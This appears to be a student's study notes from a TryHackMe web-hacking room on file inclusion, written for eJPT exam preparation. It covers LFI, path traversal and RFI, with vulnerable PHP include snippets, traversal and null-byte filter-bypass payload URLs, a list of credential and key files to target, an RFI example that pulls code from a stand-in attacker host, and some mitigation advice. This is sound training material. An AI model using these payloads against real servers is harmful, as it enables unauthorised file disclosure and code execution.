---
{"dg-publish":true,"permalink":"/thm-notes/web-fundamentals-path/baisc-vuln/file-inclusion-web-hacking/","title":"File Inclusion","tags":["web"]}
---

## NOTES

-----------

#### Exploit Definition: 

1. File inclusion is a security vulnerability found in web applications where an attacker can manipulate the input parameters of a web application to include files that should not be accessible. This can lead to unauthorized access to files on the server, execution of arbitrary code, and potentially full control over the server.

### Types of File Inclusion

There are two primary types of file inclusion vulnerabilities:

1. **Local File Inclusion (LFI)**
2. Remote File Inclusion (RFI)

## Why do File inclusion vulnerabilities happen?
File inclusion vulnerabilities are commonly found and exploited in various programming languages for web applications, such as PHP that are poorly written and implemented. The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. When the input is not validated, the user can pass any input to the function, causing the vulnerability.
## What is the risk of File inclusion?
By default, an attacker can leverage file inclusion vulnerabilities to leak data, such as code, credentials or other important files related to the web application or operating system. Moreover, if the attacker can write files to the server by any other means, file inclusion might be used in tandem to gain remote command execution (RCE).

----
## Path Traversal or Directory Traversal
### Important Notes on Path Traversal Vulnerability

**Path Traversal Overview:**
- **Definition:** Also known as Directory Traversal, it's a web security vulnerability allowing attackers to read files on the server outside the application's root directory.
- **Mechanism:** Attackers manipulate URLs to access unauthorized files by using directory traversal sequences like `../`.

**Key Concepts:**
- **Entry Point:** Typically involves URLs with parameters that reference files, e.g., `get.php?file=`.
- **Payloads:** Use traversal sequences (`../../`) to navigate up the directory structure and access sensitive files.

**Exploitation Process:**
1. **Identify the Vulnerable Parameter:** Find URL parameters that can be manipulated to include file paths.
2. **Craft Payload:** Use traversal sequences to move up the directory hierarchy.
   - Example: `http://webapp.thm/get.php?file=../../../../etc/passwd` for Linux systems.
3. **Target Specific Files:** Aim for sensitive files like `/etc/passwd` (Linux) or `c:\boot.ini` (Windows).

**Key Files and Directories:**
- **Linux:**
  - `/etc/issue`: System identification message.
  - `/etc/profile`: System-wide default variables.
  - `/proc/version`: Linux kernel version.
  - `/etc/passwd`: Registered users.
  - `/etc/shadow`: User passwords.
  - `/root/.bash_history`: Root user command history.
  - `/var/log/dmessage`: System messages.
  - `/var/mail/root`: Root user's emails.
  - `/root/.ssh/id_rsa`: Private SSH keys.
  - `/var/log/apache2/access.log`: Apache access logs.

- **Windows:**
  - `c:\boot.ini`: Boot options.
  - `c:\windows\win.ini`: Windows initialization file.

**Mitigation Strategies:**
- **Input Validation:** Ensure strict validation of user inputs to prevent traversal sequences.
- **Whitelisting:** Restrict file access to a predefined set of safe files or directories.
- **Sanitization:** Remove or neutralize harmful input sequences like `../`.
- **Use of Realpath Functions:** In PHP, use `realpath()` to resolve the absolute path and check it against a safe directory.

-----
### Local File Inclusion (LFI) Overview

Local File Inclusion (LFI) is a type of vulnerability that allows an attacker to include files on a server through the web browser. This can lead to the exposure of sensitive files, the execution of arbitrary code, and potentially full control over the server. LFI vulnerabilities commonly occur due to improper handling of user input in functions that include files, such as `include()`, `require()`, `include_once()`, and `require_once()` in PHP.

### LFI Exploitation Scenarios

#### Scenario 1: Basic LFI Exploit

**Vulnerable Code:**

```php
<?php 
include($_GET["lang"]);
?>
```

**Explanation:**
- The PHP code uses a GET request parameter `lang` to include a file.
- An attacker can manipulate the `lang` parameter to include any readable file on the server.
- Example: `http://webapp.thm/index.php?lang=EN.php` or `http://webapp.thm/index.php?lang=AR.php` for normal operation.

**Exploitation:**
- To read sensitive files, such as `/etc/passwd`, an attacker can craft the following URL:
  - `http://webapp.thm/index.php?lang=/etc/passwd`
- This works because there is no directory specified and no input validation.

**Important Note for EJPT:**
- Understand how to identify and exploit basic LFI vulnerabilities.
- Recognize the significance of input validation in preventing such attacks.

#### Scenario 2: Directory-Specified LFI

**Vulnerable Code:**

```php
<?php 
include("languages/" . $_GET['lang']); 
?>
```

**Explanation:**
- The developer specified a directory (`languages/`) in the `include` function.
- The `lang` parameter is appended to the `languages/` directory.

**Exploitation:**
- The attacker can manipulate the `lang` parameter to traverse directories and include files from outside the `languages` directory.
- Example exploit URL to read `/etc/passwd`:
  - `http://webapp.thm/index.php?lang=../../../../etc/passwd`
- The traversal sequence (`../../../../`) moves up the directory hierarchy until it reaches the root directory, and then accesses `/etc/passwd`.

**Important Note for EJPT:**
- Understand how directory traversal sequences work in the context of LFI.
- Recognize that specifying directories in the `include` function does not necessarily prevent LFI if input validation is not implemented.

### Key Points for Cybersecurity Students and EJPT Preparation

1. **Identifying LFI Vulnerabilities:**
   - Look for file inclusion functions (`include()`, `require()`) that use user input.
   - Test URL parameters that influence file inclusion.

2. **Crafting Exploits:**
   - Use directory traversal sequences (`../`) to move up the directory structure.
   - Target sensitive files like `/etc/passwd` on Linux or `c:\boot.ini` on Windows.

3. **Common Targets:**
   - **Linux:**
     - `/etc/passwd`: Contains user information.
     - `/etc/shadow`: Contains password hashes.
     - `/root/.bash_history`: Root user command history.
   - **Windows:**
     - `c:\boot.ini`: Boot options.
     - `c:\windows\win.ini`: Windows initialization file.

4. **Preventing LFI Vulnerabilities:**
   - Implement robust input validation and sanitization.
   - Use allowlists to restrict permissible file inclusions.
   - Avoid using user input directly in file inclusion functions.

5. **Practical Exercises:**
   - Set up a vulnerable web application to practice identifying and exploiting LFI.
   - Use different payloads to understand the behavior of the application and how it handles file inclusion.

By mastering the concepts and techniques related to LFI vulnerabilities, students can better prepare for practical cybersecurity challenges, including those encountered in the EJPT exam.

-----
### Advanced Local File Inclusion (LFI) Techniques

Local File Inclusion (LFI) vulnerabilities allow attackers to include files on a server through web browser input. This section covers advanced techniques for exploiting LFI vulnerabilities, especially in scenarios where source code is not available (black box testing) and various filters are in place.

#### Scenario 1: Bypassing File Extension Filters with Null Bytes

**Vulnerable Entry Point:**

```php
http://webapp.thm/index.php?lang=EN
```

**Observation:**
- Invalid input such as `THM` gives an error:
  ```plaintext
  Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
  ```
- The error shows the include path and indicates `.php` is appended to the input.

**Exploit:**
- Using directory traversal to escape the intended directory:
  ```plaintext
  http://webapp.thm/index.php?lang=../../../../etc/passwd
  ```
- If the `.php` extension is appended, the server will look for `passwd.php`, which doesn't exist.

**Bypassing with Null Byte:**
- Null Byte injection terminates the string before `.php`:
  ```plaintext
  http://webapp.thm/index.php?lang=../../../../etc/passwd%00
  ```
- This makes the include function consider the input as `include("languages/../../../../../etc/passwd");`

**Important Note for EJPT:**
- Understand the concept of Null Byte injection and its limitations (fixed in PHP 5.3.4 and above).

#### Scenario 2: Bypassing Filters with Current Directory Trick

**Scenario:**
- The developer filters out certain keywords such as `/etc/passwd`.

**Bypassing Filter:**
- Use the current directory trick:
  ```plaintext
  http://webapp.thm/index.php?lang=/etc/passwd/.
  ```
- This bypasses the filter by appending `/.`, which is interpreted as the same directory.

**Alternate Bypass with Null Byte:**
- Use Null Byte to terminate string before the filter kicks in:
  ```plaintext
  http://webapp.thm/index.php?lang=/etc/passwd%00
  ```

**Important Note for EJPT:**
- Learn various techniques to bypass keyword filters using directory traversal and Null Byte injection.

#### Scenario 3: Bypassing Directory Traversal Filters

**Scenario:**
- Developer filters out `../` sequences, replacing them with an empty string.

**Bypassing Filter:**
- Use a repetitive sequence that circumvents the filter:
  ```plaintext
  http://webapp.thm/index.php?lang=....//....//....//etc/passwd
  ```
- This works because the filter only replaces the first `../`, allowing traversal.

**Important Note for EJPT:**
- Understand how to craft payloads that exploit single-pass filters by using repetitive traversal sequences.

#### Scenario 4: Forced Directory Inclusions

**Scenario:**
- Developer enforces inclusion from a specific directory:
  ```php
  http://webapp.thm/index.php?lang=languages/EN.php
  ```

**Exploitation:**
- Include directory traversal within the enforced directory path:
  ```plaintext
  http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd
  ```
- This forces the include function to process the payload from the specified directory, bypassing the restriction.

**Important Note for EJPT:**
- Understand how to manipulate enforced directory paths to include sensitive files outside the intended directory.

### Key Points for Cybersecurity Students and EJPT Preparation

1. **Error Messages and Black Box Testing:**
   - Utilize error messages to infer how inputs are processed.
   - Understand common error message patterns that reveal directory structures and file paths.

2. **Advanced Payload Crafting:**
   - Learn to use Null Byte injections and directory traversal sequences effectively.
   - Practice constructing payloads that bypass various filters and restrictions.

3. **Defensive Coding Practices:**
   - Recognize the importance of robust input validation and sanitization.
   - Implement allowlists to restrict permissible file inclusions.
   - Avoid using user input directly in file inclusion functions.

4. **Hands-On Practice:**
   - Set up vulnerable environments to practice advanced LFI exploitation techniques.
   - Experiment with different payloads to understand how various filters and validations can be bypassed.
----
### Remote File Inclusion (RFI)

Remote File Inclusion (RFI) is a critical vulnerability that allows an attacker to include remote files into a vulnerable web application. This type of attack occurs due to improper sanitization of user inputs, which allows external URLs to be injected into file inclusion functions. RFI poses a higher risk compared to Local File Inclusion (LFI) because it can lead to Remote Command Execution (RCE) on the server.

#### Key Points About RFI:
- **Conditions for RFI:** The `allow_url_fopen` option in PHP must be enabled.
- **Risks:** RFI can lead to severe consequences such as:
  - Remote Command Execution (RCE)
  - Sensitive Information Disclosure
  - Cross-Site Scripting (XSS)
  - Denial of Service (DoS)

#### RFI Attack Steps:

1. **Hosting a Malicious File:**
   - The attacker hosts a malicious PHP file on their server. For example, the file `cmd.txt` on `http://attacker.thm/cmd.txt` might contain:
     ```php
     <?php echo "Hello THM"; ?>
     ```

2. **Injecting the Malicious URL:**
   - The attacker injects the malicious URL into the vulnerable web application. The URL might look like:
     ```plaintext
     http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
     ```

3. **Execution on the Target Server:**
   - If the web application does not validate the input, the include function fetches and executes the remote file. The web server sends a GET request to `http://attacker.thm/cmd.txt`, includes its content, and executes it within the context of the web application.

4. **Output Observation:**
   - The execution result, such as the message "Hello THM", is displayed on the web application, indicating that the attack was successful.

#### Practical Example:
Visit the provided lab URL to practice an RFI attack:
```plaintext
http://10.10.221.166/playground.php
```

#### Important Notes for Cybersecurity Students:

1. **Understanding PHP Configurations:**
   - Familiarize yourself with PHP configurations like `allow_url_fopen` and `allow_url_include`. These settings can significantly impact the ability to perform RFI attacks.

2. **Input Validation and Sanitization:**
   - Recognize the importance of proper input validation and sanitization to prevent RFI. Using a whitelist approach to allow only certain files can help mitigate this risk.

3. **File Inclusion Functions:**
   - Know the common PHP functions that can be exploited for file inclusion vulnerabilities:
     - `include()`
     - `require()`
     - `include_once()`
     - `require_once()`

4. **Risk Mitigation:**
   - Ensure that `allow_url_fopen` and `allow_url_include` are disabled unless absolutely necessary.
   - Implement strong input validation and use prepared statements to handle user inputs safely.
   - Regularly update and patch web applications to address known vulnerabilities.
------


